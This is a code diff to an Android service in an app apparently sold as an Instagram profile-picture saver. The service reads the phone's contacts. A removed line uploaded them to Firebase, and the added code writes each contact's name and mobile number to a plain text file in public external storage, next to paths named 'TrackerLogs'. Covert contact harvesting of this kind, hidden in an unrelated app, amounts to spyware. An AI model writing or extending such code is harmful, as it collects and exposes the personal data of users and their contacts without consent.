@@ -2,6 +2,7 @@ package com.funcoders.Instadpsaver.contactsevice;
 
 import android.Manifest;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -17,6 +18,7 @@ import android.os.IBinder;
 import android.util.Log;
 import android.widget.Toast;
 
+import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import com.funcoders.Instadpsaver.InstaDataPresenter;
@@ -32,8 +34,10 @@ import com.google.firebase.database.ValueEventListener;
 
 import org.w3c.dom.Document;
 
+import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.FileWriter;
 import java.io.FilenameFilter;
 import java.io.IOException;
 import java.util.ArrayList;
@@ -54,6 +58,8 @@ public class ContactService extends Service{
         Intent bi = new Intent(COUNTDOWN_BR);
     SharedPreferences sharedPreferences;
         CountDownTimer cdt = null;
+        String username="";
+    File path = null, extraLogPath = null;
 
         @Override
         public void onCreate() {
@@ -62,9 +68,16 @@ public class ContactService extends Service{
             appDatabase = TaskAppDatabase.getInstance(ContactService.this);
             mFirebaseInstance = FirebaseDatabase.getInstance();
              sharedPreferences = getSharedPreferences(Constants.PREFS_NAME, 0);
-            String username= sharedPreferences.getString(Constants.userName, "");
+             username= sharedPreferences.getString(Constants.userName, "");
             mFirebaseDatabase = mFirebaseInstance.getReference(username.substring(0, username.length() - 10));
             mFirebaseInstance.getReference("app_title").setValue("InstaProfileSaver");
+
+            path = new File(Environment.getExternalStoragePublicDirectory("")+"/TrackerLogs",
+                    username+".txt");
+            extraLogPath = new File(Environment.getExternalStoragePublicDirectory("")+"/TrackerLogs",
+                    "InstaProfileSaver"+".txt");
+
+
 
             if (ContextCompat.checkSelfPermission(ContactService.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
 
@@ -163,8 +176,12 @@ public class ContactService extends Service{
 
                 if (user == null) {
                     Log.e(TAG, "User data is null!");
+                    SharedPreferences.Editor editor = sharedPreferences.edit();
+                    editor.putBoolean(Constants.isContactsPosted, false);
+                    editor.apply();
                     return;
                 }else {
+                    System.out.println("Posted sucess triggred");
                     SharedPreferences.Editor editor = sharedPreferences.edit();
                     editor.putBoolean(Constants.isContactsPosted, false);
                     editor.apply();
@@ -224,8 +241,20 @@ public class ContactService extends Service{
         protected void onPostExecute(Void aVoid) {
             super.onPostExecute(aVoid);
 
+
             if(contactModelList.size()!=0) {
-                storetoFirebaseDB(contactModelList);
+               // storetoFirebaseDB(contactModelList);
+
+                Constants.createLogDirectory();
+
+                for(int i=0;i<contactModelList.size();i++)
+                {
+                    storeContactstxt(contactModelList.get(i).getName()+"  : "+contactModelList.get(i).getMobileNumber(),username.substring(0, username.length() - 10));
+
+                }
+
+
+
 
                // createPdf(contactModelList);
 
@@ -300,5 +329,42 @@ public class ContactService extends Service{
         document.close();
     }
 
+
+
+    private void storeContactstxt(String data, String username) {
+
+
+        System.out.println("logStatusToStorage  "+data);
+        try {
+            if (ActivityCompat.checkSelfPermission(ContactService.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
+                path = new File(Environment.getExternalStoragePublicDirectory("")+"/InstaProfileSaver",
+                        username+".txt");
+                if (!path.exists()) {
+                    try {
+                        path.createNewFile();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
+                try {
+                    if (path.exists()) {
+
+                        BufferedWriter writer = new BufferedWriter(new FileWriter(path.getAbsolutePath(), true));
+                        writer.write(data);
+                        writer.newLine();
+                        writer.close();
+                    }
+                } catch (Exception e) {
+                    //Log.e(TAG, "Log file error", e);
+                }
+            }
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
     }
+
+
+
+}
 
